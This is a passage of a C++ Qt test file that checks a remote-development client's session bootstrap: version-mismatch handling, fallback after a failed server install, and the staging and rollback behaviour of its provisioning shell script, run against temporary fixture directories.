      // names an older release, and the node there cannot run the new one.
      // Nothing is written, and the session comes up on what is installed.
        Harness h;
        h.boot.setRemoteArtifactUrl(artifactUrl());
        h.boot.fakeScript(
            true, inspectionReport(QStringLiteral("v22.11.0"), installedEntry(),
                                   QStringLiteral("https://example.invalid/v8/"
                                                  "codeharbor-remote.tar.gz")));
        QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);
        QSignalSpy diagSpy(&h.boot, &SessionBootstrap::channelDiagnostic);
        QSignalSpy upgradeSpy(&h.boot, &SessionBootstrap::upgradeFailed);

        QVERIFY(h.wire());
        QCOMPARE(h.boot.state(), State::Wired);
        QVERIFY(h.boot.rpcDevice() != nullptr);
        QVERIFY2(errorSpy.isEmpty(),
                 qPrintable(errorSpy.value(0).value(0).toString()));
        // Nobody asked for this update, so it is a log line rather than a toast
        // on a session that is coming up fine.
        QVERIFY(upgradeSpy.isEmpty());
        QCOMPARE(diagSpy.size(), 1);
        const QString note = diagSpy.at(0).at(1).toString();
        QVERIFY2(note.contains(QStringLiteral("22.11.0")), qPrintable(note));
        QVERIFY2(note.contains(QStringLiteral("23.6")), qPrintable(note));
        QVERIFY2(note.contains(installedEntry()), qPrintable(note));
        // The inspection, and NOTHING else: the install never started.
        QCOMPARE(h.boot.scriptsRun.size(), 1);
    }
    { // The same server with the upgrade explicitly requested. Same outcome for
      // the service; the difference is that the user is told, through the one
      // signal a successful connect does not discard.
        Harness h;
        h.boot.setRemoteArtifactUrl(artifactUrl());
        h.boot.fakeScript(true, inspectionReport(QStringLiteral("v22.11.0"),
                                                 installedEntry()));
        QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);
        QSignalSpy upgradeSpy(&h.boot, &SessionBootstrap::upgradeFailed);

        h.boot.requestRemoteUpgrade();
        QVERIFY(h.wire());
        QCOMPARE(h.boot.state(), State::Wired);
        QVERIFY(errorSpy.isEmpty());
        QCOMPARE(upgradeSpy.size(), 1);
        const QString message = upgradeSpy.at(0).at(0).toString();
        QVERIFY2(message.contains(QStringLiteral("22.11.0")), qPrintable(message));
        QVERIFY2(message.contains(QStringLiteral("Nothing was written")),
                 qPrintable(message));
        QVERIFY2(message.contains(installedEntry()), qPrintable(message));
        QCOMPARE(h.boot.scriptsRun.size(), 1);
    }
    { // ...and the line that must NOT move: with nothing installed there is
      // nothing to fall back to, so an install onto a node that cannot run the
      // result is still refused outright rather than deferred to a dead channel.
        Harness h;
        h.boot.setRemoteArtifactUrl(artifactUrl());
        h.boot.fakeScript(true, inspectionReport(QStringLiteral("v22.11.0")));
        QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);

        QVERIFY(!h.wire());
        QCOMPARE(h.boot.state(), State::Failed);
        QCOMPARE(errorSpy.size(), 1);
        QCOMPARE(h.boot.scriptsRun.size(), 1);
    }
}

// Defect two: the install itself. It unpacked straight over the live tree, so a
// failure halfway left a directory half old and half new; now the archive is
// staged and swapped in, and a failed swap is rolled back on the server.
//
// The client does not TRUST that rollback, because a script that was killed
// outright never runs it: it re-reads the directory and connects only to an
// entry point that is really still there.
void TstSessionBootstrap::anInstallThatFailedFallsBackToWhatSurvivedOnTheServer()
{
    const QString oldRelease =
        QStringLiteral("https://example.invalid/v8/codeharbor-remote.tar.gz");
    { // The install dies partway. The re-read finds the previous release intact
      // — marker and entry point both — so the session comes up on it.
        Harness h;
        h.boot.setRemoteArtifactUrl(artifactUrl());
        h.boot.fakeScript(true, inspectionReport(QStringLiteral("v24.16.0"),
                                                 installedEntry(), oldRelease));
        h.boot.fakeScript(false, QString(),
                          QStringLiteral("curl: (23) Failed writing body"));
        // What the server still holds afterwards: the rolled-back install.
        h.boot.fakeScript(true, inspectionReport(QStringLiteral("v24.16.0"),
                                                 installedEntry(), oldRelease));
        QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);
        QSignalSpy diagSpy(&h.boot, &SessionBootstrap::channelDiagnostic);

        QVERIFY(h.wire());
        QCOMPARE(h.boot.state(), State::Wired);
        QVERIFY(h.boot.rpcDevice() != nullptr);
        QVERIFY2(errorSpy.isEmpty(),
                 qPrintable(errorSpy.value(0).value(0).toString()));
        // Inspect, install, re-inspect: the survivor is READ, never assumed.
        QCOMPARE(h.boot.scriptsRun.size(), 3);
        QCOMPARE(diagSpy.size(), 1);
        const QString note = diagSpy.at(0).at(1).toString();
        QVERIFY2(note.contains(QStringLiteral("Failed writing body")),
                 qPrintable(note));
        QVERIFY2(note.contains(installedEntry()), qPrintable(note));
    }
    { // ...and when the re-read finds nothing launchable, there is nothing to
      // fall back to and the attempt fails, loudly. Connecting here would hand
      // the user "codeharbord channel closed" a moment later instead.
        Harness h;
        h.boot.setRemoteArtifactUrl(artifactUrl());
        h.boot.fakeScript(true, inspectionReport(QStringLiteral("v24.16.0"),
                                                 installedEntry(), oldRelease));
        h.boot.fakeScript(false, QString(), QStringLiteral("tar: unexpected EOF"));
        h.boot.fakeScript(true, inspectionReport(QStringLiteral("v24.16.0")));
        QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);

        QVERIFY(!h.wire());
        QVERIFY(h.boot.rpcDevice() == nullptr);
        QCOMPARE(errorSpy.size(), 1);
        const QString message = errorSpy.at(0).at(0).toString();
        QVERIFY2(message.contains(QStringLiteral("unexpected EOF")),
                 qPrintable(message));
        QCOMPARE(h.boot.scriptsRun.size(), 3);
    }
}

// Everything above drives the DECISION tree with canned server answers. This
// case runs the script that decision produces, under a real POSIX sh, against
// real files — the only way to know that a rollback written as shell text
// actually puts a tree back. The root carries a space and a single quote, so the
// quoting is exercised by the shell rather than by a substring assertion.
//
// POSIX HOSTS ONLY, and deliberately so. This is a script for the SERVER, which
// runs codeharbord under Node on a POSIX box; the machine running these tests is
// the CLIENT, and on Windows it is not a host this script can execute. Windows CI
// proved the point the expensive way: the case aborted, and MSVC's CRT turns any
// abort into a fail-fast that takes the whole binary down, so one unsupported
// fixture cost the other 55 cases their results too. The decision tree above is
// pinned on every platform; the SCRIPT is pinned here on POSIX and, against a
// real server, by the live gate (tst_livereconnect).
void TstSessionBootstrap::theProvisionScriptStagesTheArchiveAndRollsBackUnderARealShell()
{
#ifdef Q_OS_WIN
    QSKIP("the provisioning script targets a POSIX server; a Windows client host "
          "cannot run it (tst_livereconnect covers it on a real server)");
#else
    const QString shell = QStandardPaths::findExecutable(QStringLiteral("sh"));
    const QString tarTool = QStandardPaths::findExecutable(QStringLiteral("tar"));
    if (shell.isEmpty() || tarTool.isEmpty())
        QSKIP("a POSIX sh and a tar are needed to run the provisioning script");
    {
        QProcess probe;
        probe.start(shell,
                    {QStringLiteral("-c"),
                     QStringLiteral("for c in rm mv cp tar printf; do command -v "
                                    "\"$c\" >/dev/null 2>&1 || exit 1; done; "
                                    "echo TOOLCHAIN_OK")});
        if (!probe.waitForFinished(30000)
            || !QString::fromUtf8(probe.readAllStandardOutput())
                    .contains(QStringLiteral("TOOLCHAIN_OK"))) {
            QSKIP("this sh cannot reach the utilities the provisioning script "
                  "uses; the live gate covers it against a real server");
        }
    }

    QTemporaryDir dir;
    QVERIFY(dir.isValid());
    const QString root = dir.filePath(QStringLiteral("srv/co de'harbor"));
    const QString marker = SessionBootstrap::releaseMarkerPath(root);
    const QString scratch = root + QStringLiteral("/.codeharbor-provision");

    // Fixture writes go through Qt, not the shell, so a failure here is a broken
    // test rather than an unsupported host — and a value-returning lambda cannot
    // host QVERIFY.
    const auto put = [](const QString& path, const QString& text) {
        QDir().mkpath(QFileInfo(path).absolutePath());
        QFile file(path);
        if (!file.open(QIODevice::WriteOnly | QIODevice::Truncate))
            qFatal("could not create fixture file %s", qUtf8Printable(path));
        file.write(text.toUtf8());
    };
    const auto slurp = [](const QString& path) {
        QFile file(path);
        return file.open(QIODevice::ReadOnly)
                   ? QString::fromUtf8(file.readAll())
                   : QString();
    };
    struct Run {
        int code = -1;
        QString out;
        QString err;
    };
    // A script that hangs is reported as a failed assertion on `code`, never as
    // an abort: taking the whole binary down would throw away every other case's
    // result along with it.
    const auto install = [&shell](const QString& script) {
        QProcess sh;
        sh.start(shell, {QStringLiteral("-c"), script});
        const bool finished = sh.waitForFinished(60000);
        if (!finished)
            sh.kill();
        return Run{finished ? sh.exitCode() : -1,
                   QString::fromUtf8(sh.readAllStandardOutput()),
                   finished ? QString::fromUtf8(sh.readAllStandardError())
                            : QStringLiteral("the provisioning script never "
                                             "finished")};
    };

    // A real codeharbor-remote.tar.gz: dist/, package.json and sql/ at the top
    // level, exactly as .github/workflows/release.yml packs them.
    const auto pack = [&dir, &tarTool, &put](const QString& name,
                                             const QStringList& members) {
        const QString stage = dir.filePath(name);
        for (const QString& member : members)
            put(stage + QLatin1Char('/') + member, name + QLatin1Char(' ') + member);
        QStringList top;
        for (const QString& member : members) {
            const QString first = member.section(QLatin1Char('/'), 0, 0);
            if (!top.contains(first))
                top << first;
        }
        const QString tarball = dir.filePath(name + QStringLiteral(".tar.gz"));
        QProcess tar;
        tar.setWorkingDirectory(stage);
        tar.start(tarTool, QStringList{QStringLiteral("-czf"), tarball} + top);
        // Empty rather than fatal: the caller turns it into a failed assertion
        // naming the archive, which is a test result instead of a dead binary.
        if (!tar.waitForFinished(60000) || tar.exitCode() != 0)
            return QString();
        return tarball;
    };
    // A staged tarball (a bare absolute path) is copied rather than downloaded,
    // so this needs no network — the fetch step is otherwise identical.
    const QString release =
        pack(QStringLiteral("release"),
             {QStringLiteral("dist/codeharbord.js"), QStringLiteral("dist/bridge.js"),
              QStringLiteral("package.json"), QStringLiteral("sql/schema.sql")});
    QVERIFY2(!release.isEmpty(), "could not pack the release fixture archive");
    // Something that unpacks perfectly well and is not a remote release.
    const QString notARelease =
        pack(QStringLiteral("junk"), {QStringLiteral("package.json")});
    QVERIFY2(!notARelease.isEmpty(), "could not pack the non-release fixture archive");

    // (1) A bare server. The entry point lands where entryCandidates() looks and
    // the marker records what was installed.
    const Run first =
        install(SessionBootstrap::remoteProvisionScript(root, release,
                                                       QStringLiteral("curl")));
    QCOMPARE(first.code, 0);
    QVERIFY2(first.out.contains(QStringLiteral("codeharbor: installed ")
                                + root + QStringLiteral("/dist/codeharbord.js")),
             qPrintable(first.out + first.err));
    QCOMPARE(slurp(root + QStringLiteral("/dist/codeharbord.js")),
             QStringLiteral("release dist/codeharbord.js"));
    QCOMPARE(slurp(marker), release + QLatin1Char('\n'));
    // Nothing is left behind: the staging tree, the backup and the download all
    // lived under one scratch directory that the script removes.
    QVERIFY(!QFileInfo::exists(scratch));

    // (2) An update over that install. Files the archive does not carry belong
    // to the user and must survive the swap.
    put(root + QStringLiteral("/dist/codeharbord.js"), QStringLiteral("old daemon"));
    put(root + QStringLiteral("/notes.txt"), QStringLiteral("mine"));
    const Run second =
        install(SessionBootstrap::remoteProvisionScript(root, release,
                                                       QStringLiteral("curl")));
    QCOMPARE(second.code, 0);
    QCOMPARE(slurp(root + QStringLiteral("/dist/codeharbord.js")),
             QStringLiteral("release dist/codeharbord.js"));
    QCOMPARE(slurp(root + QStringLiteral("/notes.txt")), QStringLiteral("mine"));

    // (3) THE BUG. The fetch fails halfway — here because the tarball is not
    // there at all — and the installation that was working is still working,
    // byte for byte, marker included.
    put(root + QStringLiteral("/dist/codeharbord.js"), QStringLiteral("old daemon"));
    put(marker, QStringLiteral("https://example.invalid/v8/codeharbor-remote.tar.gz\n"));
    const Run absent = install(SessionBootstrap::remoteProvisionScript(
        root, dir.filePath(QStringLiteral("gone.tar.gz")), QStringLiteral("curl")));
    QVERIFY2(absent.code != 0, qPrintable(absent.out));
    QVERIFY2(absent.err.contains(
                 QStringLiteral("putting the previous installation back")),
             qPrintable(absent.err));
    QCOMPARE(slurp(root + QStringLiteral("/dist/codeharbord.js")),
             QStringLiteral("old daemon"));
    QCOMPARE(slurp(marker),
             QStringLiteral("https://example.invalid/v8/codeharbor-remote.tar.gz\n"));
    QVERIFY(!QFileInfo::exists(scratch));

    // (4) An archive that unpacks and is not a release. Judged in the staging
    // directory, so the live tree never sees it: the old daemon and the old
    // manifest are both untouched.
    put(root + QStringLiteral("/package.json"), QStringLiteral("old manifest"));
    const Run junk = install(SessionBootstrap::remoteProvisionScript(
        root, notARelease, QStringLiteral("curl")));
    QVERIFY2(junk.code != 0, qPrintable(junk.out));
    QVERIFY2(junk.err.contains(QStringLiteral("not a codeharbor-remote release")),
             qPrintable(junk.err));
    QCOMPARE(slurp(root + QStringLiteral("/dist/codeharbord.js")),
             QStringLiteral("old daemon"));
    QCOMPARE(slurp(root + QStringLiteral("/package.json")),
             QStringLiteral("old manifest"));
    QCOMPARE(slurp(marker),
             QStringLiteral("https://example.invalid/v8/codeharbor-remote.tar.gz\n"));

    // (5) The marker is part of what is rolled back, in both directions. A
    // failed install over a hand-unpacked tree must not leave a marker claiming
    // the directory as ours: the next connect would read that as "our install,
    // wrong release" and overwrite what a person put there.
    QVERIFY(QFile::remove(marker));
    const Run unmarked = install(SessionBootstrap::remoteProvisionScript(
        root, notARelease, QStringLiteral("curl")));
    QVERIFY(unmarked.code != 0);
    QVERIFY2(!QFileInfo::exists(marker), qPrintable(slurp(marker)));
    QCOMPARE(slurp(root + QStringLiteral("/dist/codeharbord.js")),
             QStringLiteral("old daemon"));

    // (6) The state no trap can catch: a run killed outright (SIGKILL, or the
    // machine going down) partway through the swap. Its `moved` list and its
    // backup are still on disk, and the NEXT attempt is the only thing left that
    // can finish the undo — so it does that first, before its own `rm -rf` would
    // take the sole copy of the displaced files with it.
    //
    // Set up by hand because a real kill cannot be timed reliably; the state is
    // exactly what the swap loop leaves between its two `mv`s.
    put(marker, QStringLiteral("https://example.invalid/v8/codeharbor-remote.tar.gz\n"));
    put(root + QStringLiteral("/dist/codeharbord.js"), QStringLiteral("half-new daemon"));
    put(scratch + QStringLiteral("/backup/dist/codeharbord.js"),
        QStringLiteral("old daemon"));
    put(scratch + QStringLiteral("/plan"), QStringLiteral("dist\n"));
    put(scratch + QStringLiteral("/ready"), QString());
    put(scratch + QStringLiteral("/release.prev"),
        QStringLiteral("https://example.invalid/v8/codeharbor-remote.tar.gz\n"));
    // This attempt then fails at the fetch, so nothing of its own lands: what is
    // left is purely what the interrupted run had before it started.
    const Run resumed = install(SessionBootstrap::remoteProvisionScript(
        root, dir.filePath(QStringLiteral("gone.tar.gz")), QStringLiteral("curl")));
    QVERIFY2(resumed.code != 0, qPrintable(resumed.out));
    QVERIFY2(resumed.err.contains(QStringLiteral("an earlier install was "
                                                 "interrupted")),
             qPrintable(resumed.err));
    QCOMPARE(slurp(root + QStringLiteral("/dist/codeharbord.js")),
             QStringLiteral("old daemon"));
    QCOMPARE(slurp(marker),
             QStringLiteral("https://example.invalid/v8/codeharbor-remote.tar.gz\n"));
    QVERIFY(!QFileInfo::exists(scratch));

    // ...and the recovered tree is installable again: the next attempt with a
    // real archive completes, which is what makes this recoverable rather than
    // merely intact.
    const Run afterResume =
        install(SessionBootstrap::remoteProvisionScript(root, release,
                                                       QStringLiteral("curl")));
    QCOMPARE(afterResume.code, 0);
    QCOMPARE(slurp(root + QStringLiteral("/dist/codeharbord.js")),
             QStringLiteral("release dist/codeharbord.js"));
    QCOMPARE(slurp(marker), release + QLatin1Char('\n'));

    // (7) The other two states the swap loop can be interrupted in. A member is
    // CLAIMED before it is touched, so the claim alone says nothing about what
    // happened to it, and the undo has to read the difference off the disk.
    put(root + QStringLiteral("/dist/codeharbord.js"), QStringLiteral("old daemon"));
    put(root + QStringLiteral("/sql/schema.sql"), QStringLiteral("new schema"));
    // `dist` was claimed and never touched — its staged copy is still waiting —
    // so what is under the root is the user's and must be left alone. `sql` was
    // claimed, moved in, and had no old counterpart: it belongs to the failed
    // install and goes.
    put(scratch + QStringLiteral("/stage/dist/codeharbord.js"),
        QStringLiteral("release dist/codeharbord.js"));
    put(scratch + QStringLiteral("/release.none"), QString());
    put(scratch + QStringLiteral("/plan"), QStringLiteral("sql\ndist\n"));
    put(scratch + QStringLiteral("/ready"), QString());
    const Run partial = install(SessionBootstrap::remoteProvisionScript(
        root, dir.filePath(QStringLiteral("gone.tar.gz")), QStringLiteral("curl")));
    QVERIFY2(partial.code != 0, qPrintable(partial.out));
    QCOMPARE(slurp(root + QStringLiteral("/dist/codeharbord.js")),
             QStringLiteral("old daemon"));
    QVERIFY(!QFileInfo::exists(root + QStringLiteral("/sql")));
    // release.none said there was no marker, so the undo must not invent one.
    QVERIFY(!QFileInfo::exists(marker));
    QVERIFY(!QFileInfo::exists(scratch));

    // (8) A plan with NO sentinel beside it. That is a run which died while
    // writing the plan, before it had touched anything, so the plan may hold a
    // fragment of a name — and a fragment is precisely what must never reach the
    // undo, because it can name something of the user's that no install touched.
    // Ignoring the whole plan is both safe and correct: nothing had moved.
    put(root + QStringLiteral("/dist/codeharbord.js"), QStringLiteral("old daemon"));
    put(root + QStringLiteral("/di"), QStringLiteral("not the daemon's"));
    put(scratch + QStringLiteral("/plan"), QStringLiteral("di"));
    const Run unsealed = install(SessionBootstrap::remoteProvisionScript(
        root, dir.filePath(QStringLiteral("gone.tar.gz")), QStringLiteral("curl")));
    QVERIFY2(unsealed.code != 0, qPrintable(unsealed.out));
    QVERIFY2(!unsealed.err.contains(QStringLiteral("an earlier install was "
                                                   "interrupted")),
             qPrintable(unsealed.err));
    QCOMPARE(slurp(root + QStringLiteral("/di")),
             QStringLiteral("not the daemon's"));
    QCOMPARE(slurp(root + QStringLiteral("/dist/codeharbord.js")),
             QStringLiteral("old daemon"));

    // (9) The state the ordering above exists to make harmless: a run that
    // COMMITTED and was then killed inside its own `rm -rf`, leaving a plan and a
    // pruned backup behind. Because the sentinel is unlinked before that walk
    // begins, what survives cannot authorise an undo — and it must not, because
    // every planned member now has neither a backup nor a staged copy, which is
    // precisely the shape an undo DELETES. Without the ordering this is a
    // successful install that the next attempt takes back out.
    const Run committed =
        install(SessionBootstrap::remoteProvisionScript(root, release,
                                                       QStringLiteral("curl")));
    QCOMPARE(committed.code, 0);
    put(root + QStringLiteral("/notes.txt"), QStringLiteral("mine"));
    // The scratch as a killed cleanup leaves it: plan intact, backup gone,
    // sentinel already unlinked.
    put(scratch + QStringLiteral("/plan"),
        QStringLiteral("dist\npackage.json\nsql\n"));
    put(scratch + QStringLiteral("/release.prev"), release + QLatin1Char('\n'));
    const Run afterCommit = install(SessionBootstrap::remoteProvisionScript(
        root, dir.filePath(QStringLiteral("gone.tar.gz")), QStringLiteral("curl")));
    QVERIFY2(afterCommit.code != 0, qPrintable(afterCommit.out));
    QVERIFY2(!afterCommit.err.contains(QStringLiteral("an earlier install was "
                                                      "interrupted")),
             qPrintable(afterCommit.err));
    // The committed installation is untouched, and so is the user's own file.
    QCOMPARE(slurp(root + QStringLiteral("/dist/codeharbord.js")),
             QStringLiteral("release dist/codeharbord.js"));
    QCOMPARE(slurp(root + QStringLiteral("/sql/schema.sql")),
             QStringLiteral("release sql/schema.sql"));
    QCOMPARE(slurp(root + QStringLiteral("/notes.txt")), QStringLiteral("mine"));
    QCOMPARE(slurp(marker), release + QLatin1Char('\n'));
#endif
}

// Guiless: nothing here needs a display, and QTEST_MAIN would pull in
// QGuiApplication (ch_app links Qt6::Gui) and abort headless.
QTEST_GUILESS_MAIN(TstSessionBootstrap)
#include "tst_sessionbootstrap.moc"
